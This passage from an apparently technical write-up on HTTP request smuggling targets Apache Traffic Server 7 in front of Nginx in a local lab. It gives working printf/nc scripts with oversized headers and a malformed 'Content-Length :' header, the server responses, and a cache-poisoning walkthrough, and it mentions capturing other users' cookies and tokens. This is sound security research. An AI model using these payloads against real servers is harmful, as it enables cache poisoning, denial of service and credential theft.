+&lt;p&gt;This attack is almost the same as the previous one, but do not need the magical &lt;strong&gt;NULL&lt;/strong&gt; character to trigger the end-of-query event.&lt;/p&gt;
+
+&lt;p&gt;By using headers with a size around &lt;strong&gt;65536 characters&lt;/strong&gt; we can trigger this event, and exploit it the same way than the with the NULL premature end of query.&lt;/p&gt;
+
+&lt;p&gt;A note on printf huge header generation with &lt;code&gt;printf&lt;/code&gt;. Here I&#39;m generating a query with one header containing a lot of repeated characters (&lt;code&gt;=&lt;/code&gt; or &lt;code&gt;1&lt;/code&gt; for example):&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;X: ==============( 65 532 &#39;=&#39; )========================\r\n
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;You can use the &lt;code&gt;%ns&lt;/code&gt; form in printf to generate this, generating big number of spaces.&lt;/p&gt;
+
+&lt;p&gt;But to do that we need to replace some special characters with tr and use &lt;code&gt;_&lt;/code&gt; instead of spaces in the original string:&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;X:_&amp;quot;%65532s&amp;quot;\r\n&amp;#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; tr &lt;span class=&quot;s2&quot;&gt;&amp;quot; &amp;quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;=&amp;quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; tr &lt;span class=&quot;s2&quot;&gt;&amp;quot;_&amp;quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot; &amp;quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Try it against Nginx :&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET_/something.html?zorg=6_HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:_dummy-host7.example.com\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;X:_&amp;quot;%65532s&amp;quot;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;GET_http://dummy-host7.example.com/index.html?replaced=0&amp;amp;cache=8_HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt;tr &lt;span class=&quot;s2&quot;&gt;&amp;quot; &amp;quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt;tr &lt;span class=&quot;s2&quot;&gt;&amp;quot;_&amp;quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot; &amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt;nc -q &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; 127.0.0.1 8002&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;I gat one error 400, that&#39;s the normal stuff. It Nginx does not like huge headers.&lt;/p&gt;
+
+&lt;p&gt;Now try it against ATS7:&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET_/something.html?zorg2=5_HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:_dummy-host7.example.com\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;X:_&amp;quot;%65534s&amp;quot;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;GET_http://dummy-host7.example.com/index.html?replaced=0&amp;amp;cache=8_HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt;tr &lt;span class=&quot;s2&quot;&gt;&amp;quot; &amp;quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt;tr &lt;span class=&quot;s2&quot;&gt;&amp;quot;_&amp;quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot; &amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt;nc -q &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; 127.0.0.1 8007&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;And after the error 400 we have a &lt;strong&gt;200 OK&lt;/strong&gt; response. Same problem as in the previous example, and same fix. Here we still have a query with a bad header containing a space, and also one quite big header but we do not have the NULL character. But, yeah, 65000 character is very big, most actors would reject a query after 8000 characters on one line.&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span class=&quot;kr&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;400&lt;/span&gt; &lt;span class=&quot;ne&quot;&gt;Invalid HTTP Request&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Date&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;Fri, 26 Oct 2018 15:40:17 GMT&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;keep-alive&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Server&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;ATS/7.1.1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Cache-Control&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;no-store&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;text/html&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Language&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;en&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;220&lt;/span&gt;
+
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;HTML&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;HEAD&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;TITLE&amp;gt;&lt;/span&gt;Bad Request&lt;span class=&quot;nt&quot;&gt;&amp;lt;/TITLE&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/HEAD&amp;gt;&lt;/span&gt;
+
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;BODY&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;BGCOLOR=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;white&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;FGCOLOR=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;black&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;H1&amp;gt;&lt;/span&gt;Bad Request&lt;span class=&quot;nt&quot;&gt;&amp;lt;/H1&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;HR&amp;gt;&lt;/span&gt;
+
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;FONT&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;FACE=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Helvetica,Arial&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;B&amp;gt;&lt;/span&gt;
+Description: Could not process this request. 
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/B&amp;gt;&amp;lt;/FONT&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;HR&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/BODY&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span class=&quot;kr&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;ne&quot;&gt;OK&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Server&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;ATS/7.1.1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Date&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;Fri, 26 Oct 2018 15:40:17 GMT&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;text/html&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;120&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Last-Modified&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;Fri, 26 Oct 2018 14:16:28 GMT&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;ETag&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;&amp;quot;5bd321bc-78&amp;quot;&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;X-Location-echo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;/index.html?replaced=0&amp;amp;cache=8&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;X-Default-VH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;0&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Cache-Control&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;public, max-age=300&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept-Ranges&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;bytes&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Age&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;0&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;keep-alive&lt;/span&gt;
+
+$&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;&lt;/span&gt;Nginx default static page&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Hello World&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;It works!&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2&gt;Cache Poisoning using Incomplete Queries and Bad Separator Prefix&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;Cache poisoning&lt;/strong&gt;, that&#39;s sound great. On smuggling attacks you should only have to trigger a request or response splitting attack to prove a defect, but when you push that to cache poisoning people usually understand better why splitted pipelines are dangerous.&lt;/p&gt;
+
+&lt;p&gt;ATS support an invalid header Syntax:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;HEADER[SPACE]:HEADER VALUE\r\n
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;That&#39;s not conform to &lt;a href=&quot;https://tools.ietf.org/html/rfc7230#section-3.3.2&quot;&gt;RFC7230 section 3.3.2&lt;/a&gt;:&lt;/p&gt;
+
+&lt;blockquote&gt;&lt;p&gt;Each header field consists of a case-insensitive field name followed
+by a colon (&quot;:&quot;), optional leading whitespace, the field value, and
+optional trailing whitespace.&lt;/p&gt;&lt;/blockquote&gt;
+
+&lt;p&gt;So :&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;HEADER:HEADER_VALUE\r\n =&amp;gt; OK
+HEADER:[SPACE]HEADER_VALUE\r\n =&amp;gt; OK
+HEADER:[SPACE]HEADER_VALUE[SPACE]\r\n =&amp;gt; OK
+HEADER[SPACE]:HEADER_VALUE\r\n =&amp;gt; NOT OK
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And &lt;a href=&quot;https://tools.ietf.org/html/rfc7230#section-3.2.4&quot;&gt;RFC7230 section 3.2.4&lt;/a&gt; adds (bold added):&lt;/p&gt;
+
+&lt;blockquote&gt;&lt;p&gt;&lt;strong&gt;No whitespace is allowed between the header field-name and colon&lt;/strong&gt;.  In
+the past, differences in the handling of such whitespace have led to
+security vulnerabilities in request routing and response handling.  A
+server MUST reject any received request message that contains
+whitespace between a header field-name and colon with a response code
+of 400 (Bad Request). A proxy MUST remove any such whitespace from a
+response message before forwarding the message downstream.&lt;/p&gt;&lt;/blockquote&gt;
+
+&lt;p&gt;ATS will interpret the bad header, and also forward it without alterations.&lt;/p&gt;
+
+&lt;p&gt;Using this flaw we can add some headers in our request that are &lt;strong&gt;invalid&lt;/strong&gt; for any
+valid HTTP agents but still interpreted by ATS like:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Content-Length :77\r\n
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Or (try it as an exercise)&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Transfer-encoding :chunked\r\n
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Some HTTP servers will effectively reject such message with an error 400.
+But some will simply &lt;em&gt;ignore&lt;/em&gt; the invalid header. That&#39;s the case of Nginx for example.&lt;/p&gt;
+
+&lt;p&gt;ATS will maintain a keep-alive connection to the Nginx Backend, so we&#39;ll use this ignored header to transmit &lt;strong&gt;a body&lt;/strong&gt; (ATS think it&#39;s a body) that is in fact &lt;strong&gt;a new query&lt;/strong&gt; for the backend. And we&#39;ll make this query incomplete (missing a crlf
+on end-of-header) to absorb a future query sent to Nginx. This sort of incomplete-query filled by the next coming query is also a basic Smuggling technique demonstrated 13 years ago.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;01 GET /does-not-exists.html?cache=x HTTP/1.1\r\n
+02 Host: dummy-host7.example.com\r\n
+03 Cache-Control: max-age=200\r\n
+04 X-info: evil 1.5 query, bad CL header\r\n
+05 Content-Length :117\r\n
+06 \r\n
+07 GET /index.html?INJECTED=1 HTTP/1.1\r\n
+08 Host: dummy-host7.example.com\r\n
+09 X-info: evil poisoning query\r\n
+10 Dummy-incomplete:
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Line &lt;strong&gt;05&lt;/strong&gt; is invalid (&#39; :&#39;). But for ATS it is valid.&lt;/li&gt;
+&lt;li&gt;Lines &lt;strong&gt;07/08/09/10&lt;/strong&gt; are just binary body data for ATS transmitted to backend.&lt;/li&gt;
+&lt;/ul&gt;
+
+
+&lt;p&gt;For Nginx:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Line &lt;strong&gt;05&lt;/strong&gt; is ignored.&lt;/li&gt;
+&lt;li&gt;Line &lt;strong&gt;07&lt;/strong&gt; is a new request (and first response is returned).&lt;/li&gt;
+&lt;li&gt;Line &lt;strong&gt;10&lt;/strong&gt; has no &quot;\r\n&quot;. so Nginx is still waiting for the end of this query, on the keep-alive connection opened by ATS ...&lt;/li&gt;
+&lt;/ul&gt;
+
+
+&lt;h3&gt;Attack schema&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt;[ATS Cache poisoning - space before header separator + backend ignoring bad headers]
+Innocent        Attacker           ATS            Nginx
+    |               |               |               |
+    |               |--A(1A+1/2B)--&amp;gt;|               | * Issue 1 &amp;amp; 2 *
+    |               |               |--A(1A+1/2B)--&amp;gt;| * Issue 3 *
+    |               |               |&amp;lt;-A(404)-------|
+    |               |               |            [1/2B]
+    |               |&amp;lt;-A(404)-------|            [1/2B]
+    |               |--C-----------&amp;gt;|            [1/2B]
+    |               |               |--C-----------&amp;gt;| * ending B *
+    |               |            [*CP*]&amp;lt;--B(200)----|
+    |               |&amp;lt;--B(200)------|               |
+    |--C---------------------------&amp;gt;|               |
+    |&amp;lt;--B(200)--------------------[HIT]             |
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;ul&gt;
+&lt;li&gt;1A + 1/2B means request A + an incomplete query B&lt;/li&gt;
+&lt;li&gt;A(X) : means X query is hidden in body of query A&lt;/li&gt;
+&lt;li&gt;CP : Cache poisoning&lt;/li&gt;
+&lt;li&gt;Issue 1 : ATS transmit &#39;header[SPACE]: Value&#39;, a bad HTTP header.&lt;/li&gt;
+&lt;li&gt;Issue 2 : ATS interpret this bad header as valid (so 1/2B still hidden in body)&lt;/li&gt;
+&lt;li&gt;Issue 3 : Nginx encounter the bad header but ignore the header instead of
+          sending an error 400. So 1/2B is discovered as a new query (no Content-length)
+          request B contains an incomplete header (no crlf)&lt;/li&gt;
+&lt;li&gt;ending B: the 1st line of query C ends the incomplete header of query B.
+          all others headers are added to the query. C disappears and mix C
+          HTTP credentials with all previous B headers (cookie/bearer token/Host, etc.)&lt;/li&gt;
+&lt;/ul&gt;
+
+
+&lt;p&gt;Instead of cache poisoning you could also play with the incomplete &lt;code&gt;1/B&lt;/code&gt; query and wait for the Innocent query to finish this request with HTTP credentials of this user (cookies, HTTP Auth, JWT tokens, etc.). That would be another attack vector. Here we will &lt;em&gt;simply&lt;/em&gt; demonstrate cache poisoning.&lt;/p&gt;
+
+&lt;p&gt;Run this attack:&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; i in &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;1..9&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET /does-not-exists.html?cache=&amp;#39;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39; HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host: dummy-host7.example.com\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Cache-Control: max-age=200\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;X-info: evil 1.5 query, bad CL header\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Content-Length :117\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;GET /index.html?INJECTED=&amp;#39;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39; HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host: dummy-host7.example.com\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;X-info: evil poisoning query\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Dummy-unterminated:&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt;nc -q &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; 127.0.0.1 8007
+&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;It should work, Nginx adds an X-Location-echo header in this lab configuration, where we have
+the first line of the query added on the response headers. This way we can observe that the second response is removing the real second query first line and replacing it with the hidden
+first line.&lt;/p&gt;
+
+&lt;p&gt;On my case the last query response contained:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt; X-Location-echo: /index.html?INJECTED=3
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;But this last query was &lt;code&gt;GET /index.html?INJECTED=9&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;You can check the cache content with:&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; i in &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;1..9&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET /does-not-exists.html?cache=&amp;#39;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39; HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host: dummy-host7.example.com\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Cache-Control: max-age=200\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt;nc -q &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; 127.0.0.1 8007
+&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;In my case I found 6 404 (regular) and 3 200 responses (ouch), the cache &lt;strong&gt;is&lt;/strong&gt; poisoned.&lt;/p&gt;
+
+&lt;p&gt;If you want to go deeper in Smuggling understanding you should try to play with wireshark on this example. Do not forget to restart the cluster to empty the cache.&lt;/p&gt;
+
+&lt;p&gt;Here we did not played with a C query yet, the cache poisoning occurs on our A query. Unless you consider the &lt;code&gt;/does-not-exists.html?cache=&#39;$i&#39;&lt;/code&gt; as C queries. But you can easily try to inject a C query on this cluster, where Nginx as some waiting requests, try to get it poisoned with &lt;code&gt;/index.html?INJECTED=3&lt;/code&gt; responses:&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; i in &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;1..9&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET /innocent-C-query.html?cache=&amp;#39;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39; HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host: dummy-host7.example.com\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Cache-Control: max-age=200\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt;nc -q &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; 127.0.0.1 8007
+&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This may give you a touch on &lt;em&gt;real world&lt;/em&gt; exploitations, you have to repeat the attack to obtain something. Vary the number of servers on the cluster, the pools settings on the various layers of reverse proxies, etc. Things get complex. The easiest attack is to be a &lt;strong&gt;chaos generator&lt;/strong&gt; (defacement like or DOS), fine cache replacement of a target on the other hand requires fine study and a bit of luck.&lt;/p&gt;
+
